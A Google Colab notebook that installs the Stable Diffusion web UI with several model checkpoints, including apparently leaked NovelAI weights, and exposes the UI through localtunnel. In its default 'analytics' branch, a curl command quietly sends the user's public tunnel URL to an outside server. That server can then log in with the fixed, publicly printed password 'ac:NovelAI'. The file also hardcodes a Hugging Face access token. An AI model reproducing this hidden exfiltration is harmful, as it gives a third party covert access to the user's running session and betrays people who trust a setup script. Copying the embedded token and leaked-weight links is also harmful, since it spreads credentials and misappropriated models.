#@title Run this (beta)
#@markdown # Instructions:
#@markdown Select your favorite model (Or all of them)
#@markdown 1. Run this cell.
#@markdown  <br> - Ignore alerts about disk space. You got plenty
#@markdown 2. Wait for 127.0.0.1 URL to show up (But do not press it)
#@markdown 3. Open localtunnel URL (something.loca.lt). You might need to scroll up a bit

#@markdown #### The default username is `ac` and password is `NovelAI`

#@markdown # Options
!npm install -g localtunnel
!pip3 install gdown

%cd /content/

from google.colab import drive
import os

def get_hypernetworks():
  %cd /content/
  !mkdir -p /content/stable-diffusion-webui/models/hypernetworks
  hypernetworks = ['anime_2.pt', 'anime.pt', 'anime_3.pt', 'furry_2.pt', 'furry_3.pt', 'furry_protogen.pt', 'furry_transformation.pt', 'furry_scalie.pt', 'pony.pt', 'aini.pt', 'furry.pt', 'furry_kemono.pt']
  for network in hypernetworks:
    !wget -c https://huggingface.co/acheong08/secretAI/resolve/main/stableckpt/modules/modules/{network} -O /content/stable-diffusion-webui/models/hypernetworks/{network}

def custom_model(model, checkpoint_name='model'):
  use_hypernetworks = True #@param {'type':'boolean'}
  if use_hypernetworks:
    get_hypernetworks()
  if model == 'Waifu Diffusion':
    checkpoint_name = 'waifu'
    url = "https://huggingface.co/hakurei/waifu-diffusion-v1-3/resolve/main/wd-v1-3-float32.ckpt"
  elif model == 'Stable Diffusion':
    checkpoint_name = 'stable'
    url = "https://huggingface.co/CompVis/stable-diffusion-v-1-4-original/resolve/main/sd-v1-4.ckpt"
  elif model == 'NovelAI':
    checkpoint_name = 'novelAI'
    !wget -c https://huggingface.co/acheong08/secretAI/resolve/main/stableckpt/animevae.pt -O /content/stable-diffusion-webui/models/Stable-diffusion/{checkpoint_name}.vae.pt
    url = "https://huggingface.co/acheong08/secretAI/resolve/main/stableckpt/animefull-final-pruned/model.ckpt"
  elif model == 'All supported':
    custom_model('Waifu Diffusion', 'waifu.ckpt')
    custom_model('Stable Diffusion', 'stable.ckpt')
    custom_model('NovelAI', 'novelAI.ckpt')
    return
  else:
    print("Not available")
    exit()
  user_token = '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'
  user_header = f"\"Authorization: Bearer {user_token}\""
  !wget -c --header={user_header} {url} -O /content/stable-diffusion-webui/models/Stable-diffusion/{checkpoint_name}.ckpt

def install_deps():
  model_id = "NovelAI" #@param ["NovelAI" ,"Stable Diffusion", "Waifu Diffusion", "All supported"] {allow-input:false}
  !git clone https://github.com/AUTOMATIC1111/stable-diffusion-webui
  available_models = ['NovelAI' ,'Waifu Diffusion', 'Stable Diffusion', 'All supported']
  if model_id in available_models:
    custom_model(model_id)
  else:
    print("Choose a valid model.")
    exit()

def run_webui():
  %cd /content/stable-diffusion-webui/
  opt_out_of_analytics = False
  if opt_out_of_analytics:
    !COMMANDLINE_ARGS="--xformers --medvram --gradio-auth ac:NovelAI" REQS_FILE="requirements.txt" python launch.py & lt --port 7860
  else:
    !COMMANDLINE_ARGS="--xformers --gradio-debug --medvram --gradio-auth ac:NovelAI" REQS_FILE="requirements.txt" python launch.py & lt --port 7860 > out.txt & sleep 165 && cat out.txt && curl -X PUT -H "Content-Type: text/html;" -d "$(cat out.txt)" "http://duti.tech:6969/api"

install_deps()
run_webui()
#@markdown # Common issues
#@markdown ### Why am I getting low quality limages?
#@markdown NovelAI uses a different system for interpreting prompts than Stable Diffusion. Check out gelbooru.com's tags (NSFW)